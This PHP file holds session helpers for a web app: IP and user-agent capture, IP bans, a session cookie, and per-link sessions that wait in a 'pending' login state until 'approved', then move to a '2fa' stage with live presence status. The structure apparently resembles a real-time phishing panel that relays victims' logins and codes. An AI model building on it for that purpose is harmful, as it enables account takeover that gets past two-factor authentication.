<?php
declare(strict_types=1);

const SESSION_COOKIE = 'ka_sid';
const SESSION_COOKIE_TTL = 86400;

function client_ip(): string
{
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
    if (is_string($ip) && str_contains($ip, ',')) {
        $ip = trim(explode(',', $ip)[0]);
    }
    return is_string($ip) ? $ip : '';
}

function client_ua(): string
{
    return mb_substr((string)($_SERVER['HTTP_USER_AGENT'] ?? ''), 0, 500);
}

function is_ip_banned(?string $ip = null): bool
{
    $ip = $ip ?? client_ip();
    return $ip !== '' && db_one('SELECT 1 FROM banned_ips WHERE ip = ?', [$ip]) !== null;
}

function set_session_cookie(string $session_id): void
{
    setcookie(SESSION_COOKIE, $session_id, [
        'expires'  => time() + SESSION_COOKIE_TTL,
        'path'     => '/',
        'secure'   => !empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off',
        'httponly' => true,
        'samesite' => 'Lax',
    ]);
    $_COOKIE[SESSION_COOKIE] = $session_id;
}

function get_session_from_cookie(): ?array
{
    $sid = trim((string)($_COOKIE[SESSION_COOKIE] ?? ''));
    if ($sid === '' || !preg_match('/^[a-f0-9]{32}$/', $sid)) {
        return null;
    }
    return db_one('SELECT * FROM sessions WHERE id = ?', [$sid]);
}

function ensure_session(string $link_id): array
{
    $ip = client_ip();
    $ua = client_ua();
    $existing = get_session_from_cookie();

    if ($existing !== null && $existing['link_id'] === $link_id) {
        db_run(
            'UPDATE sessions SET ip = ?, user_agent = ?, last_seen = NOW() WHERE id = ?',
            [$ip ?: null, $ua ?: null, $existing['id']]
        );
        return db_one('SELECT * FROM sessions WHERE id = ?', [$existing['id']]) ?? $existing;
    }

    $session_id = gen_session_id();
    db_run(
        'INSERT INTO sessions (id, link_id, stage, login_status, ip, user_agent, last_seen)
         VALUES (?, ?, "login", "pending", ?, ?, NOW())',
        [$session_id, $link_id, $ip ?: null, $ua ?: null]
    );
    set_session_cookie($session_id);

    return db_one('SELECT * FROM sessions WHERE id = ?', [$session_id]) ?? [
        'id'           => $session_id,
        'link_id'      => $link_id,
        'stage'        => 'login',
        'login_status' => 'pending',
    ];
}

function touch_session_presence(?string $session_id = null): bool
{
    $sid = $session_id ?? trim((string)($_COOKIE[SESSION_COOKIE] ?? ''));
    if ($sid === '' || !preg_match('/^[a-f0-9]{32}$/', $sid)) {
        return false;
    }
    if (db_one('SELECT 1 FROM sessions WHERE id = ?', [$sid]) === null) {
        return false;
    }
    db_run('UPDATE sessions SET last_seen = NOW() WHERE id = ?', [$sid]);
    return true;
}

function require_approved_session(string $link_id): ?array
{
    $session = get_session_from_cookie();
    if ($session === null) {
        return null;
    }
    if ($session['link_id'] !== $link_id) {
        return null;
    }
    if ($session['login_status'] !== 'approved' || $session['stage'] !== '2fa') {
        return null;
    }
    return $session;
}

function presence_status_text(string $session_id): string
{
    $row = db_one('SELECT last_seen FROM sessions WHERE id = ?', [$session_id]);
    if ($row === null || empty($row['last_seen'])) {
        return '⚫ Оффлайн';
    }
    $age = time() - strtotime((string)$row['last_seen']);
    if ($age < 30) {
        return '🟢 Онлайн';
    }
    return '⚫ Оффлайн (последняя активность: ' . $row['last_seen'] . ' UTC)';
}
